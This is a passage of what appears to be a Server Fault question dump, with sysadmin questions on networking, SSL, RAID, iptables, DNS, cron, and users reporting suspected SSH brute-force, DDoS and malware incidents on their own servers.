        pre-up iptables-restore &lt; /etc/network/iptables.rules # rules for acting as router
        up ifdown enp0s10 --ignore errors #to restart ifconfig settings
        up ifup enp0s10 --ignore errors

#internal eth1 this is for private lan
allow-hotplug enp1s10
iface enp1s10 inet static
        address 10.10.1.1
        network 10.10.1.0
        netmask 255.255.255.0
        gateway 192.168.1.106
        broadcast 10.10.0.255
        mtu 7152
        dns-nameservers 10.10.1.1
        metric 0
        up ethtool -s enp1s10 wol g
        up ifdown enp1s10 --ignore-errors
        up ifup enp1s10 --ignore-errors
</code></pre>
","<ubuntu><networking>","2018-07-09 17:54:18"
"920159","SSL Cert says its self-signed but decoding shows it's not","<p>I have a cert that is suddenly being presented as a self-signed cert.  Its not.  It has been working fine until now.  When I decode the cert it shows everything I would expect.  When I analyze it using an SSL Checker it says its self-signed.</p>

<p>How is this possible?</p>
","<ssl><ssl-certificate><apache2><ssl-certificate-errors>","2018-07-09 18:28:47"
"920172","URL redirect to port","<p>I currently access a hosted site at this URL: <code>http://10.1.1.165:3013</code>, but I would like to access it like <code>http://10.1.1.165/m2m</code>.  How can I do this?  I have installed the HTTP Redirect Module and tried using it with a website bound to port 3013, but it did not work.  I also have the URL Rewrite Module installed.  I am using Windows 7.</p>
","<windows><iis-7><redirect>","2018-07-09 20:00:04"
"844572","Hosting SSL tunneled OpenVPN and HTTPS on the same server at the same 443 port","<p>Is there a way to host a SSL-tunneled (using stunnel) OpenVPN server and a regular Apache HTTPS server on the same server using HAProxy? It seems that by using stunnel, the format of the packets should all the way be the same. Is there any ways to make a difference between the two kinds of packets (which is not detectable by DPI) for the HAProxy to sort them out? I tried to use different domain names for the HTTPS server and the OpenVPN Server (though they point to the same IP address) but seems it doesn't work because OpenVPN does not use SNI.</p>

<p>Thanks a lot!</p>
","<ssl><openvpn><haproxy><stunnel>","2017-04-14 18:20:16"
"844626","How to 'double lock' a file so multiple people must approve its access","<p>I have a slightly odd situation. I help run a chat network which allows people to chat in public groups, and in private message.</p>

<p>People are happy with logging the public chat but feel it would be a huge privacy violation to log the private chats. The network is specifically aimed at young people and so a few of us really want to log private chats because we think it would be a poor position to be in if an allegation was made and we said we didn't log anything in private because our volunteers were concerned for their privacy.</p>

<p>So, I'm wondering if we can implement some sort of mechanism where at least two people have to approve the reading of a log file.</p>

<p>I know in principle we could do this e.g. the file is encrypted using two people's keys, but that doesn't scale to having say 6 people with access to the log files location.</p>

<p>We also need to account for say one person with access disappearing or dying - we need two other trusted people from this group of six to be able to access the file.</p>

<p>Alternatively - any other ideas on ways of setting people's mind at ease that you're not spending your free time (what is this?) snooping on people's conversations? Access alerts etc?</p>
","<linux><security>","2017-04-15 09:37:57"
"1041570","sendMail.exe alternative","<p>Have a bunch of in-house batch scripts and what-not that utilize sendEmail.exe, which is an old perl auto-emailer application which can be found here:</p>
<p><a href=""https://github.com/mogaal/sendemail"" rel=""nofollow noreferrer"">github for sendEmail.exe</a></p>
<p>The problem is that with our migration to office365, and our security policies, smtp requires startls. SendEmail does not support startls (or have a startls option)... while there are options for both ssl and tls: yes/auto/no, none of them work.</p>
<p>One option would be to create something new with python and the smtplib library to replace sendEmail.exe, but I'd rather not re-create the wheel here.</p>
<p>Are there any other popular free utilities or programs out there, that I could easily swap out to fill this role?</p>
","<python><batch><application><utilities>","2020-11-06 18:08:52"
"972007","How the RAID0 write data?","<p>This is the RAID0 structure:</p>

<p><a href=""https://i.sstatic.net/3xdMX.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/3xdMX.png"" alt="" RAID 0""></a></p>

<p>there have 3 disks,</p>

<p>I have a question about this,
when write data into disk, is it write disk A full, then write disk B? </p>

<p>or is write a little data into disk A, then write into disk B a little, then write to disk C a little?  </p>
","<raid><hard-drive>","2019-06-19 04:52:46"
"844844","How safe is Raid 0 with Perc710P hardware raid controller?","<p>I bought my new server Dell R620 and it does have Perc710P HW Raid controller.</p>

<p>I have 4x512GB Samsung 850 Pro SSD's.</p>

<p>I will use cPanel and host over 1000 websites on server. That means I need storage space and speed. I know that Raid 0 is not safe. But what about making Raid 0 with hardware raid controller? Does it make it difference or still unsafe to use Raid 0?</p>
","<raid><dell-poweredge><hardware-raid>","2017-04-17 07:17:04"
"1041862","Is there a list of public ""POST test"" webpages like this one?","<p>For various automated tests that I do, I need to be able to make a <code>POST</code> HTTP &amp; HTTPS request to some external URL and essentially have that webpage &quot;echo&quot; what I sent. For example, if I send the POST variable &quot;meow&quot; with the value &quot;bark&quot;, I want both &quot;meow&quot; and &quot;bark&quot; to be presented somehow on the webpage.</p>
<p>I have found many ones which do this for GET data, but only one single service which does it for POST data. Namely this one: <a href=""https://httpbin.org/post"" rel=""nofollow noreferrer"">https://httpbin.org/post</a></p>
<p>While it currently works, and has worked for years, I always feel scared to depend on a single source for anything. That's why I'm looking for (preferably) many more ones which I can rotate between, which also would put less strain on that one service. (Although my testing isn't at all as heavy as this may seem to imply.)</p>
<p>Just before asking this question, I spent a long time wading through search results, finding numerous very weird websites which seemed like they would be related to this, but ended up being nonsense, as so often is the case. Please don't post links to search engine-found results unless you have actually tried that they work, because many of them just output a generic message and don't actually echo the POST data, so you can't be sure that they are really reporting the truth.</p>
<p>(If I see my randomized code in the return data, I know it worked, but if it just says &quot;it worked!&quot; I have to take their word for it.)</p>
","<https><http><testing><test>","2020-11-09 16:17:04"
"972273","CWP CentOS 7 hostname ssl not working?","<p>My Site..  <a href=""https://sajjadhsagor.com"" rel=""nofollow noreferrer"">https://sajjadhsagor.com</a> works with SSL fine.. but when i visit  <a href=""https://sajjadhsagor.com:2087"" rel=""nofollow noreferrer"">https://sajjadhsagor.com:2087</a> and try to login to admin SSL doesn't work anymore.. error says SSL issued to server1.sajjadhsagor.com which is my hostname server... I am using Let's Encrypt Auto SSL.. What i need to do? Please guide me through...Thanks
Server Info : VPS With LAMP Stack on CentOS 7 Server...</p>
","<centos><ssl><apache-2.4><centos7><lets-encrypt>","2019-06-20 17:28:07"
"844951","Server perfomance baseline","<p>I am working to get some base line server performance and network device performance. Is there any way to do that ?</p>

<pre><code>exp: calculate base line load average 
     calculate base line  mem utilization. 
     calculate base line   io 
</code></pre>

<p>So that we can compare the current value with the baseline value to see if there some issue or difference.  </p>
","<linux><networking>","2017-04-17 19:47:39"
"972305","How to tell if a server running Windows Server 2016, which you're accessing via Windows RDC, is virtual or real?","<p>How can you tell if a Windows 2016 Server you're accessing via RDC is a virtual machine?    </p>
","<virtual-machines><windows-server-2016>","2019-06-20 20:23:57"
"1042055","What are the server requirements in terms of CPU, RAM and bandwith for etherpad-lite?","<p>As my <a href=""https://serverfault.com/questions/1039110/install-etherpad-lite-for-500-1000-concurrent-users-what-are-the-server-require"">previous post</a> was marked as duplicate of a very generic question, I want to post here again,as i found an answer :-)</p>
<p>For an event with 500 to 1000 participants we plan to use etherpads for subgroup work (100-200 subgroups of 5 users each).</p>
<p>Does anybody have experiences what kind of server (in terms of CPUs, RAM, bandwidth, whatever) is required to have a optimal performance of etherpad-lite? I didn't find any documentation about performance and user numbers.</p>
<p>As mentioned in response to anx's comment, of course we do plan to run a load test, but before I'd like to get at least a rough idea of what are we talking about in terms of CPU and RAM requirements of etherpad-lite in relationship with number of concurrent users.</p>
<p>If someone has already done some testing and gathered some experience with Etherpad, this would help me reduce my own testing effort.</p>
<p>Is there a maximum number of concurrent users per pad that is recommended?</p>
<p>Is there anything to consider for such an setting?</p>
<p>Thanks!</p>
","<performance><scalability>","2020-11-10 16:41:30"
"972477","SSH brute-force from my network / domain","<p>Twice a week I receive an email to abuse@mydomain.tld that says:</p>

<pre><code>An attempt to brute-force account passwords over SSH/FTP by a machine in your domain or in your network has been detected. Attached are the host who attacks and time / date of activity. Please take the necessary action(s) to stop this activity immediately. If you have any questions please reply to this email.

Host of attacker: &lt;MYIP&gt; =&gt; server.mydomain.tld =&gt; mydomain.tld
Responsible email contacts: abuse@mydomain.tld, abuse@ovh.net
Attacked hosts in our Network: 37.228.155.101, 185.39.222.116, 77.75.254.116, 185.39.221.179, 37.228.154.167, 37.228.154.61, 85.158.181.17, 185.39.222.20

Logfile entries (time is MET / GMT+1):
Sat Jun 22 06:51:55 2019: user: vnc service: ssh target: 185.39.221.179 source: &lt;MYIP&gt;
Sat Jun 22 06:48:29 2019: user: mysqldump service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:46:59 2019: user: testftp service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:45:59 2019: user: www-data service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:44:29 2019: user: ubuntu service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:43:29 2019: user: postgres service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:41:59 2019: user: ubuntu service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:40:59 2019: user: dong service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
Sat Jun 22 06:39:29 2019: user: root service: ssh target: 185.39.222.116 source: &lt;MYIP&gt;
[ ... other 4 IPs ... ]
</code></pre>

<p>They are always the same 4 IPs.
For SSH authentication I use Google 2 factor, I have root user disabled and only an user allowed. I have also changed che port.
This is a VPS by OVH where I have a mail server so I'm a little worried.</p>
","<ssh><brute-force-attacks>","2019-06-22 06:28:52"
"1042184","I've lost my router's ip address","<p>I have a router connected directly to my pc and I misconfigured my router's ip address and had disabled dhcp on it prior and popped off the reset button(so resetting is not possible).Due to this, I'm considering pinging all possible ip's till it responds. My question is this:</p>
<ol>
<li>Suppose my router has a different network id(eg. my ip is 192.168.1.1/24 and the router's ip is 192.168.0.1, will it respond to a ping in that case if the 2 are directly connected?</li>
<li>IF not does this mean I need to keep changing my ip address to ping all possible network id's.
Very new to networking please help.</li>
</ol>
","<router><ping>","2020-11-11 17:34:47"
"972714","What can someone do with your SSH Private Key?","<p>What exactly can someone do with my Private Key after they used my laptop to create a SSH Public Key?</p>

<p>After reading a few websites, it looks like they can access a server pretending they are me when using their own computer.</p>

<p>Is this right? Can they do anything else? Anything about my own laptop?</p>

<p>Also, is it possible for me to change my laptop's private key, or do I have to accept the fact someone else will have my Private Key forever?</p>

<p>Thank you and I look forward to hearing your replies!</p>
","<ssh-keys><ssh-keygen>","2019-06-24 19:43:10"
"1042519","BackBlaze (B2) backup software recommendation","<p>I am looking for software that I can use on Windows Servers for file backup tasks to BackBlaze (B2) cloud.</p>
<p>So far I have tried Duplicati, which runs OK on small(ish) data sets, but on larger I have issues where it never completes.</p>
<p>I am also testing CloudBerry (MSP360), and while it seems it will work, I see all sorts of bugs and it is also subscription based software. I would prefer something I can buy, set and forget.</p>
<p>Any recommendations appreciated.</p>
","<windows><backup>","2020-11-14 09:15:00"
"972955","date command with formatter string is not executed in cron under Linux","<p>I have the following crontab:</p>

<pre><code># m h  dom mon dow   command
* *   * * *   /bin/date                &gt;&gt; /tmp/date.log  2&gt;&amp;1
* *   * * *   /bin/date ""+%F_%H-%M-%S"" &gt;&gt; /tmp/date2.log 2&gt;&amp;1
</code></pre>

<p>The first one executes correctly .. writing the current date to <code>/tmp/date.log</code>
The second one doesn't work. <code>/tmp/date2.log</code> is never created. The only difference is that the second date command has a formatting string as parameter. Outside of the cronjob the second date command (<code>/bin/date ""+%F_%H-%M-%S""</code>) works fine. </p>

<p>What could be the reason for this behavior?</p>

<p>My system:</p>

<p>uname -a</p>

<pre><code>Linux corsair 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
</code></pre>

<p>lsb_release -a</p>

<pre><code>Distributor ID: LinuxMint
Description:    Linux Mint 19.1 Tessa
Release:    19.1
Codename:   tessa
</code></pre>
","<linux><cron><date>","2019-06-26 11:17:21"
"1042677","System not booting up on replacing cmoss battery","<p>I have HP ProLiant dl360 Gen 7 server, after I replaced cmoss battery I am seeing blue screen. Please let me know if anything needs to be done on replacing the cmoss battery.</p>
","<hp-proliant><boot>","2020-11-16 01:19:23"
"1042689","Video Encoding/Trans coding Conversion Dedicated Server","<p>I am looking to buy a dedicated server for my video project, I have multiple video upload at the same time each video I upload is about 2-3 GB in size and about 2-3 hours in length (TV Series/Movies). Currently I am using <code>Intel Xeon E5-1650V3</code> dedicated server with <code>128GB</code> of RAM with dedicated port link speed <code>1GBPS</code> but when I convert <code>mp4/avi</code> videos into <code>HLS</code> using <code>FFMPEG</code> it takes about 40 minutes to 1 hour on each video to convert but I need some faster solution that can do within less then 15 minutes.
Some hosting companies recommends to add GPU in it.</p>
<p>Please recommend me a dedicated server specification that can handle version conversion very fast. features I will be using
<code>CentOS7</code>, <code>FFMPEG</code></p>
<p>Looking forward for recommendations</p>
","<centos7><dedicated-server><ffmpeg>","2020-11-16 07:33:35"
"1042691","How to manually trigger an update of /etc/hosts in WSL?","<p>When I start the first WSL terminal (ubuntu 20.04 bash in my case), WSL generates the <code>/etc/hosts</code> file based on the host file of my windows system <code>%WINDIR%\System32\drivers\etc\hosts</code>.</p>
<p>If I now change the <code>%WINDIR%\System32\drivers\etc\hosts</code>, e.g. add some entries, the <code>/etc/hosts</code> in my WSL is not updated. Even if I close all WSL terminals and open a new one. Only reboot of my windows system helps.</p>
<p>Is there a way I can manually trigger the update of the <code>/etc/hosts</code> so that I do not have to reboot?</p>
","<hosts><windows-subsystem-for-linux>","2020-11-16 07:45:42"
"920349","Report phishing websites","<p>Is there a central place to report domains that have made phishing attempts against my users? I usually make a report to the host of the domain (GoDaddy, generally) but I was wondering if there is a more effective place to send a report?</p>
","<spam><phishing>","2018-07-10 18:06:43"
"846031","Is there an application in Windows that lets me share only specific sections of my desktop with multiple users?","<p>I have a software application on my Windows server with UI that I want to serve to multiple users at the same time without giving them access to other resources on the server. </p>

<p>Ideally only the window of the application is shared with other users having access to that application via mouse interaction. I do not mind which technology is perused (RDP/Streaming/Whatever protocol) as long as only access to that application and its UI is granted but not other resources on the server machine. </p>

<p>Is that possible and does such software application exist? </p>
","<windows><rdp><streaming><screen-sharing>","2017-04-23 08:22:05"
"1043064","External Internet Access when Domain Controller is offline","<p>We have a single Windows Server 2019 Domain controller. We do not have a backup domain controller.</p>
<p>The Windows Server 2019 Domain Controller is also our DHCP server, and our DNS server.</p>
<p>When the Domain Controller is offline, all the devices on our network are unable to access the external internet. Of course, this is because our Domain Controller is offline, which means our DNS lookups cannot go through it.</p>
<p>When the domain controller is offline, that also means the DHCP server is offline, which means newly booted devices cannot get assigned IP addresses. I know the IP addresses on online devices are fine, until they need to renew their lease.</p>
<p>We would like to migrate the DHCP server to our Sonicwall firewall. This way, if the domain controller does go offline, our Sonicwall can still distribute IP addresses, and our network devices can still obtain IP addresses. I'll be configuring it with the same range, and make sure the proper reservations are in place. I will not enable it until the domain controller's DNS server is disabled.</p>
<p>Since the DHCP server will now reside in the Sonicwall, I will have the ability there to specify DNS settings. I plan to keep the Domain Controller are the primary DNS server, but am thinking of using either the Sonicwall or Google (8.8.8.8) as the secondary DNS server.</p>
<p>Is there any issue or concern with doing this?</p>
<p>The reason why we want to do this, is to make sure everyone still has external access to the internet, if the domain controller (primary DNS server) is offline. I know that the internal name resolutions will fail (//machine1/folder share) and break.</p>
<p>If that is not the correct way to provide external internet access to our network, in the case our primary DNS server is not available (which again is our domain controller), then can you recommend a better way to accomplish this?</p>
","<domain-name-system><firewall><domain><dhcp>","2020-11-18 14:40:27"
"973460","Websites on VPS accessible on mobile data but not on school network (don't think it's DNS)","<h3>The problem</h3>

<p>I am currently managing two websites on my VPS. I am using the <a href=""https://en.wikipedia.org/wiki/LAMP_(software_bundle)"" rel=""nofollow noreferrer"">LAMP stack</a> (Apache web server), with Virtual Hosts configured for both websites. One of those two websites uses SSL.</p>

<p>I did all the configuration over the SSH, at home on my home WiFi and the server IP was accessible, same on 3G/4G using my phone hotspot.</p>

<p>The problem is, when I connect to my school WiFi (<a href=""https://en.wikipedia.org/wiki/Eduroam"" rel=""nofollow noreferrer"">Eduroam</a>), I can't:</p>

<ul>
<li>connect to the server using SSH (neither by <em>root@server_ip</em> nor <em>root@domain_name</em>)</li>
<li>can't display the websites using browser (again, I tried server's IP or the domain names)</li>
<li>can't get any response when ping-ing the server</li>
<li>can't display any data when typing the server's IP directly to the browser</li>
</ul>

<h3>What I tried</h3>

<p>As some people recommended it could be a problem with DNS (see more: <a href=""https://serverfault.com/questions/916389/my-newly-deployed-website-working-with-mobile-data-but-not-on-wifi"">link</a>, <a href=""https://www.digitalocean.com/community/questions/website-down-but-only-on-specific-wifi-networks"" rel=""nofollow noreferrer"">link</a>), I ran the <code>nslookup</code> command on my Ubuntu, using the Google Public DNS (8.8.8.8) and three others, all with the same result:</p>

<pre><code>➜  ~ nslookup mywebsite.com 8.8.8.8
Server:     8.8.8.8
Address:    8.8.8.8#53

Non-authoritative answer:
Name:   mywebsite.com
Address: &lt;the IP of my server was listed here&gt;
</code></pre>

<p>The A records are set for both domain names and point to my VPS. Both domains have redirect from <em>www</em> to <em>non-www</em>. It's been more than several days since I edited the DNS records.</p>

<p>Any help is appreciated.</p>
","<domain-name-system><virtualhost><vps><apache2><domain-name>","2019-06-30 14:28:06"
"1043246","iptables denies unwanted access/port","<p>I want to have ports 80,8080,443,8443,9990,9993 open, accessible from everywhere.
port 8080 seems to be blocked, the browser says: ERR_CONNECTION_REFUSED</p>
<p>syslog:
<code>[ 6021.847345] iptables denied: IN=eth0 OUT= MAC=12:85:11:63:da:cb:f6:6d:05:71:95:80:08:00 SRC=my.ip.here DST=server.ip.here LEN=60 TOS=0x00 PREC=0x00 TTL=56 ID=51418 DF PROTO=TCP SPT=37536 DPT=8080 WINDOW=65535 RES=0x00 SYN URGP=0</code></p>
<p>What am I doing wrong here?</p>
<p>&quot;iptables -L&quot; result</p>
<pre><code>target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere
REJECT     all  --  anywhere             127.0.0.0/8          reject-with icmp-port-unreachable
ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https
ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:postgresql
ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:9990
ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
LOG        all  --  anywhere             anywhere             limit: avg 5/min burst 5 LOG level debug prefix &quot;iptables denied: &quot;
REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:9993 ctstate NEW,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport dports http,https ctstate NEW,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport dports http-alt,8443 ctstate NEW,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport dports 8009,8009 ctstate NEW,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http-alt

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:9993 ctstate ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport dports http,https ctstate ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport dports http-alt,8443 ctstate ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             multiport dports 8009,8009 ctstate ESTABLISHED
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere```
</code></pre>
","<debian><iptables>","2020-11-19 18:31:55"
"1043268","Do I need SiteLock on top of AWS Shield?","<p>My website is hosted on AWS and I am using the default AWS shield protection.</p>
<p>I am renewing my domain with a 3rd party provider, and the provider is asking me if I want to buy SiteLock for additional security... Do I need SiteLock if I am using AWS shield?</p>
","<amazon-web-services><security>","2020-11-19 21:28:18"
"973584","Does anti spam software block IP addresses of large smtp providers?","<p>Does anti spam software routinely block IP addresses of large smtp providers such as Mailchimp or SalesHandy?</p>
","<email><smtp><spam>","2019-07-01 16:33:48"
"973623","Why is this VirtualHost definition activating when the ServerName doesn't match?","<p>I've got a httpd24 server that I want to use to server multiple domains.</p>

<p>I've got a 3 VirtualHost definitions.</p>

<pre><code>&lt;VirtualHost *:443&gt;
   ServerName one.example.com
   # SSL stuff
   DocumentRoot ""/opt/rh/httpd24/root/var/www/one
&lt;/VirtualHost&gt;

&lt;VirtualHost *:443&gt;
   ServerName two.example.com
   # SSL stuff
   DocumentRoot ""/opt/rh/httpd24/root/var/www/two
&lt;/VirtualHost&gt;

&lt;VirtualHost _default_:443&gt;
   Redirect / https://two.example.com
&lt;/VirtualHost&gt;
</code></pre>

<p>The idea being that if the exact url one.example.com or two.example.com is entered they'll get the appropriate pages.  If any other domain is received I want to redirect to the <a href=""https://two.example.com"" rel=""nofollow noreferrer"">https://two.example.com</a> url.</p>

<p>However I'm finding that if I enter <a href=""https://three.example.com"" rel=""nofollow noreferrer"">https://three.example.com</a> I'm not getting redirected, instead the content for one.example.com is served.</p>

<p>Note that <a href=""https://two.example.com"" rel=""nofollow noreferrer"">https://two.example.com</a> does work as expected.  My issue is that I'm expected unknown domains to be redirected, but they are instead being resolved as if they were one.example.com.</p>

<p>The RPM I installed originally was httpd24-httpd-2.4.27-8.el6.1.x86_64.</p>

<p>Any ideas what is going on?</p>
","<apache-2.4><httpd><httpd.conf><rhel6>","2019-07-02 01:21:39"
"1043478","Unplugging power bank usb safely","<p>I have a strange question, but please bear with me.</p>
<p>Mostly I charge a power bank via usb in my laptop. When I want to unplug it, Windows does not show a &quot;Safely remove hardware&quot; option and icon in the system tray.</p>
<p>Is it safe to often use a power bank in USB and unplugging it right away (without safely removing hardware)?</p>
<p>Thanks</p>
","<usb>","2020-11-22 12:05:57"
"973693","Cannot serve node application","<p>I cannot hit this node application from the browser <code>52.138.7.79 refused to connect.</code> but i can load up nginx on 80 fine. also i can hit it on the machine using curl. This is running on a Azure Vm and the port is open, the rhel firewall is disabled ... any help is appreciated. </p>

<p><a href=""https://i.sstatic.net/35fvn.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/35fvn.png"" alt=""enter image description here""></a></p>

<p><a href=""https://i.sstatic.net/PabRA.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/PabRA.png"" alt=""enter image description here""></a></p>
","<networking><redhat><node.js>","2019-07-02 12:15:28"
"846600","Set up Windows Server 2012 R2 before migrating wordpress website","<p>My company decides to move their website to a new Windows Dedicated Server. I am a totally newbie right here, and have no idea what to do.</p>

<p>Can you please let me know what are the steps to do that? Tried to figure it out but some posts are to confusing.</p>

<p>I have Installed IIS,php and wordpress. What should I do further?</p>

<p>PS. Our current website is live so I need to move it with as much less time as possible please</p>
","<php><iis><windows-server-2012-r2><nameserver>","2017-04-26 08:26:45"
"1043581","How does the A record change over time by running a DNS query?","<p>I am running a DNS query on <a href=""http://www.wikipedia.org"" rel=""nofollow noreferrer"">www.wikipedia.org</a> using Google's public resolver @8.8.8.8 using the mac terminal. I have to get the A records for the host and run the query a couple of times to notice any change to the A records.</p>
<pre><code>dig @8.8.8.8 www.wikipedia.org 
</code></pre>
<p>I've run the query about 10 times but I see nothing new happening. However, since the question asks for describing the change, I feel like I'm doing something wrong here.</p>
","<domain-name-system><mac><udp><dns-hosting><terminal>","2020-11-23 11:52:31"
"1043616","Kerberos pre-authentication failed for unused Administrator account on domain controllers","<p>Our three Active Directory domain controllers are collectively reporting thousands of <em>'Kerberos pre-authentication failed'</em> events a week, where the <code>IpAddress</code> field is of a domain controller (but always a different one) and the <code>TargetSid</code> field is the domain <em>Administrator</em> account. Looking at all those particular events I also noticed that -- with the exception if the <code>EventData/Ipport</code> field which is random, and the <code>EventData/Ipaddress</code> field which is always a domain controller -- all other <code>EventData</code> fields always have the same value.</p>
<p>The domain controllers are brand new and the <em>Administrator</em> is not used on those machines. Not to start a service, not to run tasks, not for anything else. I'm 99.99% certain that it's not a compromised domain controller. Our domain controllers are healthy, <code>dcdiag /q</code> isn't reporting any issues.</p>
<p>I do not understand what is going on and need help understanding those particular events and why they are reported. Here is one of the events:</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'&gt;
    &lt;System&gt;
        &lt;Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/&gt;
        &lt;EventID&gt;4771&lt;/EventID&gt;
        &lt;Version&gt;0&lt;/Version&gt;
        &lt;Level&gt;0&lt;/Level&gt;
        &lt;Task&gt;14339&lt;/Task&gt;
        &lt;Opcode&gt;0&lt;/Opcode&gt;
        &lt;Keywords&gt;0x8010000000000000&lt;/Keywords&gt;
        &lt;TimeCreated SystemTime='2020-11-23T14:52:18.851767600Z'/&gt;
        &lt;EventRecordID&gt;49462065&lt;/EventRecordID&gt;
        &lt;Correlation/&gt;
        &lt;Execution ProcessID='652' ThreadID='2348'/&gt;
        &lt;Channel&gt;Security&lt;/Channel&gt;
        &lt;Computer&gt;dc01.company.local&lt;/Computer&gt;
        &lt;Security/&gt;
    &lt;/System&gt;
    &lt;EventData&gt;
        &lt;Data Name='TargetUserName'&gt;Administrator&lt;/Data&gt;
        &lt;Data Name='TargetSid'&gt;S-1-5-21-xxxxxxxxx-xxxxxxxxx-xxxxxxxxx-500&lt;/Data&gt;
        &lt;Data Name='ServiceName'&gt;krbtgt/COMPANY.LOCAL&lt;/Data&gt;
        &lt;Data Name='TicketOptions'&gt;0x40810010&lt;/Data&gt;
        &lt;Data Name='Status'&gt;0x18&lt;/Data&gt;
        &lt;Data Name='PreAuthType'&gt;2&lt;/Data&gt;
        &lt;Data Name='IpAddress'&gt;::ffff:10.12.22.11&lt;/Data&gt;
        &lt;Data Name='IpPort'&gt;53321&lt;/Data&gt;
        &lt;Data Name='CertIssuerName'&gt;&lt;/Data&gt;
        &lt;Data Name='CertSerialNumber'&gt;&lt;/Data&gt;
        &lt;Data Name='CertThumbprint'&gt;&lt;/Data&gt;
    &lt;/EventData&gt;
&lt;/Event&gt;
</code></pre>
","<active-directory><kerberos><windows-event-log>","2020-11-23 16:45:05"
"1043846","Meaning of Log File (DDOS)","<p>We are currently facing attacks (probably DDOS) on our server. The incoming network traffic goes from an average of 20Mbps to 1Gbps in just 2-3 minutes. The lines in our log files usually look like:</p>
<pre><code>101.101.101.101 - - [23/Nov/2020:01:01:01 +0200] &quot;GET /wp-content/uploads/image.png HTTP/1.0&quot; 200 425 &quot;https://mypage.com/&quot; &quot;Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/604.1.15 (KHTML, like Gecko) GSA/100.00 Mobile/15E100 Safari/604.1&quot;
</code></pre>
<p>However, in the time frame of the attacks the lines look like:</p>
<pre><code>101.101.101.101 - - [23/Nov/2020:01:01:01 +0200] &quot;GET / HTTP/1.0&quot; 200 18710 &quot;https://www.qq.com&quot; &quot;Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/604.1.15 (KHTML, like Gecko) GSA/100.00 Mobile/15E100 Safari/604.1&quot;
</code></pre>
<p>So instead of my page, some other websites are somehow called. Beside qq.com, the urls reddit.com, baido.com and some others are called thousands of times.</p>
<p><strong>So to my questions:</strong></p>
<ul>
<li>What does the second entry exactly mean and how does this produce traffic on our server?</li>
<li>How can we prevent such requests (firewall, fail2ban etc are already set)?</li>
</ul>
","<log-files><ddos><attacks>","2020-11-25 08:25:16"
"846977","Server CPU issues, msiexev.exe a culprit?","<p>Running a cloud server on Rackspace: Windows Server 2008 R2 x64 (4 GB Standard Instance)
It hosts sql server, IIS, and serves our application to users. It has been fine for months/years. Last night through this morning, it was ""jammed"" at 100% cpu usage, couldn't remote in, etc. Finally got in through emergency console and rebooted.</p>

<p>Server and sites will come up but CPU usage keeps going to 100% and server is becoming unresponsive every 30-60 min. Two weird questions:</p>

<ol>
<li><p>Looking at the server's task manager seems to unclog it. Yes, looking not doing anything. I get reports the server is hanging, I remote in and pull up task manager and I see system idle go back to 80's and 90's.</p></li>
<li><p>There is a file, msiexev.exe from s:\windows\security that keeps popping up on task manager and takes 50% of the processor load at least. I do not know what this file is, but it keeps reappearing when I kill the process. I even deleted the file from its folder (into recycle bin) but it reappeared in its folder and in task manager.</p></li>
</ol>

<p>I have disabled the windows installer service just in case. I read that msiexec is an install utility, but searches for msiexeV are coming up empty. Any ideas?</p>

<p>Thanks!</p>
","<windows-server-2008-r2><rackspace>","2017-04-27 19:20:03"
"920514","How to delete messages from an exim mailbox older than a specified number of days","<p>I've spent quite some time trying to figure out how to do this but it seems I'm a bit at a loss. There must be a way to do this on the command line?</p>
","<exim>","2018-07-11 17:21:27"
"920529","abcdefg.com resolves to 127.0.0.1. Why?","<p>This domain abcdefg.com doesn't use to resolve to anything. Suddenly it started to resolve to 127.0.0.1. I can see this happen in my corporate network, my home network and even on my mobile network.</p>

<p>Does anyone knows why?</p>
","<domain-name-system><localhost>","2018-07-11 19:02:13"
"847116","Faking CPU architecture on Debian","<p>I have a server which uses the armhf (armv7l, Cortex A9 ARMv7 to be precise) CPU architecture.</p>

<p>I've been trying to install a certain package on it, but that doesn't work.</p>

<p>First off, APT mentioned it simply doesn't support the architecture:</p>

